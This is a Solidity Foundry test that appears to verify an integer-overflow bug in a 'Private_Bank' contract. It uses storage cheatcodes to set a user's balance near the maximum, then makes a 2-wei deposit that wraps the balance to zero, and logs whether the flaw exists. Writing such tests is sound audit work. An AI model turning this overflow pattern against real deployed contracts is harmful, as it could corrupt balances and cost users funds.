// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol";

contract LogMock {
    function AddMessage(address, uint, string calldata) public {}
}

contract DepositOverflowTest is Test {
    Private_Bank bank;
    LogMock mockLog;
    address alice = address(0x123);
    uint256 constant maxMinusOne = type(uint256).max - 1;

    function setUp() public {
        mockLog = new LogMock();
        bank = new Private_Bank(address(mockLog));
    }

    function testDepositOverflow() public {
        // Set MinDeposit to zero (assumed at slot 1)
        vm.store(address(bank), bytes32(uint256(1)), bytes32(uint256(0)));
        
        // Dynamic slot discovery for balances mapping
        uint256 baseSlotFound = 3; // initialize to invalid value
        for (uint256 baseSlot = 0; baseSlot < 3; baseSlot++) {
            // Compute Alice's balance slot based on candidate baseSlot
            bytes32 slot = bytes32(keccak256(abi.encode(alice, baseSlot)));
            // Store test value in candidate slot
            vm.store(address(bank), slot, bytes32(maxMinusOne));
            // Verify if storage write worked
            if (bank.balances(alice) == maxMinusOne) {
                baseSlotFound = baseSlot;
                break;
            }
        }
        assertTrue(baseSlotFound != 3, "Could not discover balances mapping base slot");
        
        // Get initial contract balance
        uint256 initialBankBalance = address(bank).balance;
        
        console.log("--- BEFORE-Trigger Deposit ---");
        uint256 initialAliceBalance = bank.balances(alice);
        console.log("Alice token balance: %d", initialAliceBalance);
        console.log("Bank ETH balance: %d", initialBankBalance);
        
        console.log("--- Trigger Deposit ---");
        // Trigger overflow with 2 wei deposit
        hoax(alice, 2 wei);
        bank.Deposit{value: 2 wei}();
        
        console.log("--- AFTER-Trigger Deposit ---");
        uint256 finalAliceBalance = bank.balances(alice);
        uint256 finalBankBalance = address(bank).balance;
        console.log("Alice token balance: %d", finalAliceBalance);
        console.log("Bank ETH balance: %d", finalBankBalance);

        // Check for overflow condition and bank balance change
        bool overflowOccurred = (finalAliceBalance == 0);
        bool balanceIncreased = (finalBankBalance == initialBankBalance + 2 wei);
        bool vulnerabilityExploited = overflowOccurred && balanceIncreased;
        
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Token balance overflowed to 0 while ETH balance increased by deposit amount");
        } else {
            console.log("Vulnerability not Exist: Token balance overflow check: %s, ETH balance increase check: %s", overflowOccurred, balanceIncreased);
        }
        
        // Verify expectations
        assertEq(finalAliceBalance, 0, "Balance should overflow to 0");
        assertEq(
            finalBankBalance,
            initialBankBalance + 2 wei,
            "Contract balance should increase by deposit amount"
        );
    }
}